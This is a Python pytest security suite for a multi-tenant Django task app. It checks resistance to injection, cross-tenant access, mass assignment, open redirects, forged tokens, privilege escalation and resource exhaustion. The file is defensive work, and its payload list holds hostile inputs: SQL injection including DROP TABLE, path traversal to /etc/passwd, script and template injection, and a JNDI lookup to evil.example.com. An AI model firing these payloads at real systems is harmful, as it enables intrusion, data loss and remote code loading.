"""Adversarial sweep.

These do not test features; they attack them. Written from the position of someone with a
valid account in workspace A trying to reach workspace B, or an anonymous caller trying to
reach anything at all.
"""

from __future__ import annotations

import pytest
from rest_framework.test import APIClient

from kernel.models import ApiKey, Membership, Notification, SavedView
from kernel.roles import Role
from queues.models import Queue
from schedules.models import Schedule
from tasks.models import Comment, Label, ShareLink, Task, TaskTemplate

pytestmark = pytest.mark.django_db

INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE tasks_task; --",
    "1' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "%27%20OR%201=1",
    "../../etc/passwd",
    "....//....//etc/passwd",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${jndi:ldap://evil.example.com/a}",
    "\x00null-byte",
    "\r\nX-Injected: yes",
]


class TestInjectionResistance:
    """The ORM parameterises everything, but only if user input actually reaches the ORM
    as a value rather than as SQL. These prove it does."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_task_search_is_safe(self, client_owner, task, payload):
        response = client_owner.get("/tasks/", {"q": payload})
        assert response.status_code == 200
        assert Task.objects.count() == 1  # nothing dropped, nothing leaked

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_api_search_is_safe(self, api_client, task, payload):
        response = api_client.get("/api/v1/tasks/", {"search": payload})
        # 400 is also a correct outcome: Django rejects a null byte in a query string as a
        # suspicious operation rather than passing it down the stack. Refusing is safer
        # than processing, so both statuses count as "handled".
        assert response.status_code in (200, 400)
        assert Task.objects.count() == 1

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS[:6])
    def test_a_payload_as_a_task_title_round_trips_verbatim(
        self, client_owner, organization, task_list, payload
    ):
        """Stored, retrieved and rendered without being executed or mangled."""

        from tasks.services import create_task_from_quick_add

        created = create_task_from_quick_add(
            organization=organization, task_list=task_list, creator=organization.owner, raw=payload
        )
        response = client_owner.get(f"/tasks/{created.pk}/")
        assert response.status_code == 200
        assert b"<script>alert" not in response.content

    @pytest.mark.parametrize("payload", ["-1", "0", "99999999", "abc", "1;2", "1 OR 1=1", ""])
    def test_hostile_filter_values_do_not_error(self, api_client, task, payload):
        for param in ("assignee", "priority", "task_list", "column", "label"):
            response = api_client.get("/api/v1/tasks/", {param: payload})
            assert response.status_code == 200, f"{param}={payload!r} broke the endpoint"

    @pytest.mark.parametrize("payload", ["-1", "abc", "999999999999999999999", ""])
    def test_hostile_pagination_values_do_not_error(self, api_client, task, payload):
        for param in ("page", "page_size"):
            assert api_client.get("/api/v1/tasks/", {param: payload}).status_code in (200, 404)

    def test_ordering_cannot_traverse_relations(self, api_client, task):
        """`ordering` reaching order_by() unchecked would expose arbitrary columns."""

        response = api_client.get("/api/v1/tasks/", {"ordering": "organization__owner__password"})
        assert response.status_code == 200
        body = response.json()
        assert "password" not in str(body)


class TestIdorSweep:
    """Insecure direct object reference, applied to every model the API exposes.

    A foreign id must be 404 - not 403, which would confirm the id exists, and certainly
    not 200.
    """

    @pytest.fixture
    def foreign(self, other_organization, other_user, other_task_list, other_task):
        """A complete second tenant with one of everything."""

        other_task_list.ensure_default_columns()
        label = Label.objects.create(organization=other_organization, name="TheirLabel")
        comment = Comment.objects.create(
            organization=other_organization, task=other_task, author=other_user, body="secret"
        )
        queue = Queue.objects.create(organization=other_organization, name="theirqueue")
        schedule = Schedule.objects.create(
            organization=other_organization,
            queue=queue,
            name="TheirSchedule",
            expression_type=Schedule.ExpressionType.CRON,
            expression="* * * * *",
        )
        api_key, _ = ApiKey.issue(
            organization=other_organization, name="TheirKey", role=Role.ADMIN, created_by=other_user
        )
        saved_view = SavedView.objects.create(
            organization=other_organization, owner=other_user, name="TheirView", is_shared=True
        )
        template = TaskTemplate.objects.create(
            organization=other_organization, name="TheirTemplate", title_template="x"
        )
        notification = Notification.objects.create(
            organization=other_organization, user=other_user, title="TheirNote", natural_key="n"
        )
        return {
            "task": other_task,
            "list": other_task_list,
            "label": label,
            "comment": comment,
            "queue": queue,
            "schedule": schedule,
            "api_key": api_key,
            "saved_view": saved_view,
            "template": template,
            "notification": notification,
        }

    @pytest.mark.parametrize(
        "route,key",
        [
            ("/api/v1/tasks/{}/", "task"),
            ("/api/v1/lists/{}/", "list"),
            ("/api/v1/labels/{}/", "label"),
            ("/api/v1/comments/{}/", "comment"),
            ("/api/v1/queues/{}/", "queue"),
            ("/api/v1/schedules/{}/", "schedule"),
            ("/api/v1/api-keys/{}/", "api_key"),
            ("/api/v1/saved-views/{}/", "saved_view"),
            ("/api/v1/notifications/{}/", "notification"),
        ],
    )
    def test_api_detail_of_a_foreign_object_is_404(self, api_client, foreign, route, key):
        response = api_client.get(route.format(foreign[key].pk))
        assert response.status_code == 404, f"{route} leaked another tenant's object"

    @pytest.mark.parametrize(
        "route,key",
        [
            ("/tasks/{}/", "task"),
            ("/settings/webhooks/{}/", "task"),  # id space overlap is intentional here
            ("/schedules/{}/preview/", "schedule"),
        ],
    )
    def test_web_detail_of_a_foreign_object_is_404(self, client_owner, foreign, route, key):
        assert client_owner.get(route.format(foreign[key].pk)).status_code == 404

    @pytest.mark.parametrize(
        "route,key",
        [
            ("/tasks/{}/toggle/", "task"),
            ("/tasks/{}/archive/", "task"),
            ("/tasks/{}/comments/", "task"),
            ("/tasks/{}/subtasks/", "task"),
            ("/tasks/{}/timer/start/", "task"),
            ("/tasks/{}/save-template/", "task"),
            ("/templates/{}/apply/", "template"),
            ("/settings/api-keys/{}/revoke/", "api_key"),
        ],
    )
    def test_web_write_to_a_foreign_object_is_404(self, client_owner, foreign, route, key):
        assert client_owner.post(route.format(foreign[key].pk)).status_code == 404

    def test_nothing_in_the_other_tenant_was_modified(self, client_owner, foreign):
        for route in ("/tasks/{}/toggle/", "/tasks/{}/archive/"):
            client_owner.post(route.format(foreign["task"].pk))
        foreign["task"].refresh_from_db()
        assert foreign["task"].status == Task.Status.OPEN
        assert foreign["task"].archived_at is None


class TestMassAssignment:
    def test_organization_cannot_be_set_on_create(self, api_client, task_list, other_organization):
        response = api_client.post(
            "/api/v1/tasks/",
            {"title": "X", "task_list": task_list.pk, "organization": other_organization.pk},
            format="json",
        )
        assert Task.objects.get(pk=response.json()["id"]).organization_id != other_organization.pk

    def test_organization_cannot_be_changed_on_update(self, api_client, task, other_organization):
        api_client.patch(
            f"/api/v1/tasks/{task.pk}/", {"organization": other_organization.pk}, format="json"
        )
        task.refresh_from_db()
        assert task.organization_id != other_organization.pk

    def test_version_cannot_be_forged(self, api_client, task_list):
        response = api_client.post(
            "/api/v1/tasks/", {"title": "X", "task_list": task_list.pk, "version": 500}, format="json"
        )
        assert response.json()["version"] == 1

    def test_creator_cannot_be_forged(self, api_client, task_list, other_user):
        response = api_client.post(
            "/api/v1/tasks/", {"title": "X", "task_list": task_list.pk, "creator": other_user.pk},
            format="json",
        )
        assert Task.objects.get(pk=response.json()["id"]).creator_id != other_user.pk

    def test_completed_at_cannot_be_forged(self, api_client, task_list):
        response = api_client.post(
            "/api/v1/tasks/",
            {"title": "X", "task_list": task_list.pk, "completed_at": "2020-01-01T00:00:00Z"},
            format="json",
        )
        assert response.json()["completed_at"] is None

    def test_a_saved_view_cannot_be_created_for_someone_else(self, api_client, member, user):
        response = api_client.post(
            "/api/v1/saved-views/", {"name": "Mine", "owner": member.user.pk}, format="json"
        )
        assert SavedView.objects.get(pk=response.json()["id"]).owner_id == user.pk

    def test_an_api_key_role_cannot_exceed_the_creator(self, member, organization):
        Membership.objects.filter(pk=member.pk).update(role=Role.ADMIN)
        api = APIClient()
        api.force_authenticate(user=member.user)
        assert api.post(
            "/api/v1/api-keys/", {"name": "Escalate", "role": Role.OWNER}, format="json"
        ).status_code == 403


class TestHeaderAndRedirectSafety:
    @pytest.mark.parametrize(
        "hostile",
        ["a\r\nX-Injected: yes", "a\nSet-Cookie: evil=1", "x" * 500, "<script>", "%0d%0aX-Evil: 1"],
    )
    def test_request_id_header_injection_is_neutralised(self, client, hostile):
        response = client.get("/healthz", headers={"X-Request-ID": hostile})
        assert response["X-Request-ID"] != hostile
        assert "\n" not in response["X-Request-ID"]
        assert "\r" not in response["X-Request-ID"]
        assert len(response["X-Request-ID"]) == 32
        assert "X-Injected" not in response
        assert "X-Evil" not in response

    @pytest.mark.parametrize(
        "hostile",
        ["https://evil.example.com/", "//evil.example.com", "javascript:alert(1)", "\\\\evil.example.com"],
    )
    def test_login_next_cannot_redirect_off_site(self, client, user, hostile):
        response = client.post(
            "/accounts/login/",
            {"username": user.username, "password": "test-password-123456", "next": hostile},
        )
        if response.status_code == 302:
            assert "evil.example.com" not in response["Location"]
            assert not response["Location"].startswith("javascript:")

    def test_the_organization_header_cannot_reach_a_foreign_workspace(
        self, api_client, task, other_organization, other_task
    ):
        for value in (str(other_organization.pk), other_organization.slug, "../1", "1 OR 1=1"):
            response = api_client.get("/api/v1/tasks/", headers={"X-Organization": value})
            assert response.status_code == 200
            titles = [row["title"] for row in response.json()["results"]]
            assert other_task.title not in titles


class TestTokenSafety:
    def test_api_key_verification_is_constant_time(self):
        """A non-constant-time compare is a timing oracle for the stored digest."""

        import inspect

        from api import authentication

        source = inspect.getsource(authentication.ApiKeyAuthentication._lookup)
        assert "compare_digest" in source

    @pytest.mark.parametrize(
        "forged",
        ["", "tmk_", "tmk_abc", "tmk_abc.def", "." * 40, "tmk_" + "a" * 100 + "." + "b" * 100],
    )
    def test_forged_api_keys_are_rejected_uniformly(self, forged):
        api = APIClient()
        api.credentials(HTTP_AUTHORIZATION=f"Api-Key {forged}")
        response = api.get("/api/v1/tasks/")
        assert response.status_code in (401, 403)

        # The response must not reveal *why* the key failed - whether the prefix existed,
        # whether it was revoked, or whether it had expired. Every rejection says the same
        # thing, so there is nothing to distinguish a near-miss from a wild guess.
        body = str(response.content)
        for leak in ("revoked", "expired key", "prefix", "not found", "no such"):
            assert leak not in body.lower(), f"rejection leaked {leak!r}"

    def test_a_real_prefix_with_a_wrong_secret_is_indistinguishable_from_a_wild_guess(
        self, organization, user
    ):
        key, _token = ApiKey.issue(
            organization=organization, name="Real", role=Role.MEMBER, created_by=user
        )

        def attempt(token):
            api = APIClient()
            api.credentials(HTTP_AUTHORIZATION=f"Api-Key {token}")
            response = api.get("/api/v1/tasks/")
            return response.status_code, response.json()["error"]["message"]

        real_prefix = attempt(f"{key.prefix}.wrong-secret-entirely")
        wild_guess = attempt("tmk_000000000000.wrong-secret-entirely")
        assert real_prefix == wild_guess

    @pytest.mark.parametrize("forged", ["", "x", "../../admin", "%2e%2e%2f", "a" * 200])
    def test_forged_share_tokens_are_404(self, client, forged):
        assert client.get(f"/shared/{forged}/").status_code in (404, 301)

    @pytest.mark.parametrize("forged", ["", "x", "../../admin", "a" * 200])
    def test_forged_invitation_tokens_do_not_grant_membership(
        self, client, other_user, organization, forged
    ):
        client.force_login(other_user)
        client.post(f"/invitations/{forged}/")
        assert not Membership.objects.filter(organization=organization, user=other_user).exists()

    def test_a_revoked_share_link_cannot_be_resurrected(self, client, organization, task_list):
        link, raw = ShareLink.issue(organization=organization, task_list=task_list)
        assert client.get(f"/shared/{raw}/").status_code == 200
        link.revoke()
        assert client.get(f"/shared/{raw}/").status_code == 404


class TestPrivilegeBoundaries:
    def test_a_viewer_cannot_reach_any_admin_surface(self, client_viewer, organization):
        for url in (
            "/settings/members/",
            "/settings/api-keys/",
            "/settings/audit/",
            "/settings/webhooks/",
            "/settings/workspace/",
            "/lists/",
            "/export/tasks/",
        ):
            assert client_viewer.get(url).status_code == 403, f"{url} was reachable by a viewer"

    def test_a_member_cannot_reach_any_admin_surface(self, client_member):
        for url in (
            "/settings/members/",
            "/settings/api-keys/",
            "/settings/audit/",
            "/settings/webhooks/",
            "/export/tasks/",
        ):
            assert client_member.get(url).status_code == 403, f"{url} was reachable by a member"

    def test_an_admin_cannot_delete_the_workspace_or_change_the_plan(
        self, client, admin_membership, organization
    ):
        client.force_login(admin_membership.user)
        client.post("/settings/workspace/delete/", {"confirm": organization.name})
        organization.refresh_from_db()
        assert organization.deleted_at is None
        assert client.post("/settings/billing/change/", {"plan": "team"}).status_code == 403

    def test_a_suspended_member_loses_all_access(self, client, member, member_user):
        Membership.objects.filter(pk=member.pk).update(status=Membership.Status.SUSPENDED)
        client.force_login(member_user)
        response = client.get("/")
        # No workspace resolves, so they are sent to onboarding rather than into the org.
        assert response.status_code == 302
        assert "/workspaces/new/" in response["Location"]

    def test_removing_a_member_revokes_access_immediately(self, client, member, member_user):
        client.force_login(member_user)
        assert client.get("/").status_code == 200

        Membership.objects.filter(pk=member.pk).delete()
        assert client.get("/").status_code == 302


class TestResourceExhaustion:
    def test_quick_add_input_is_bounded(self, client_owner):
        response = client_owner.post("/quick-add/preview/", {"quick_add": "x" * 500_000})
        assert response.status_code in (200, 400, 413)

    def test_bulk_operations_are_bounded(self, client_owner, organization, task_list, user):
        from tasks.services_extra import MAX_BULK_ITEMS

        tasks = [
            Task.objects.create(
                organization=organization, task_list=task_list, creator=user, title=f"T{i}"
            )
            for i in range(5)
        ]
        response = client_owner.post(
            "/tasks/bulk/",
            {"task_ids": [t.pk for t in tasks] + list(range(10_000, 10_000 + MAX_BULK_ITEMS * 3)),
             "action": "complete"},
        )
        assert response.status_code in (302, 400)

    def test_schedule_preview_count_is_bounded(self, api_client, organization, queue):
        schedule = Schedule.objects.create(
            organization=organization,
            queue=queue,
            name="Bounded",
            expression_type=Schedule.ExpressionType.CRON,
            expression="* * * * *",
        )
        runs = api_client.get(f"/api/v1/schedules/{schedule.pk}/preview/?count=100000").json()["runs"]
        assert len(runs) <= 20

    def test_export_is_rate_limited(self, client_owner, settings):
        settings.API_THROTTLING_ENABLED = True
        statuses = [client_owner.get("/export/tasks/").status_code for _ in range(14)]
        assert 429 in statuses, "exports could be used as a denial-of-service"

    def test_a_deep_task_title_does_not_break_rendering(self, client_owner, organization, task_list, user):
        Task.objects.create(
            organization=organization, task_list=task_list, creator=user, title="A" * 240
        )
        assert client_owner.get("/tasks/").status_code == 200


class TestErrorDisclosure:
    @pytest.mark.parametrize(
        "url",
        [
            "/api/v1/tasks/999999/",
            "/api/v1/nope/",
            "/tasks/999999/",
            "/nonexistent-page/",
            "/shared/bogus/",
        ],
    )
    def test_no_error_page_leaks_internals(self, client_owner, url):
        body = client_owner.get(url).content.decode(errors="replace")
        for marker in (
            "Traceback",
            "site-packages",
            "SELECT ",
            "django.db",
            "SECRET_KEY",
            "settings.py",
            "/Users/",
            "C:\\Users",
        ):
            assert marker not in body, f"{url} leaked {marker!r}"

    def test_a_server_error_returns_a_reference_not_a_stack_trace(self, api_client):
        response = api_client.get("/api/v1/tasks/999999/")
        body = response.json()
        assert body["error"]["request_id"]
        assert "Traceback" not in str(body)
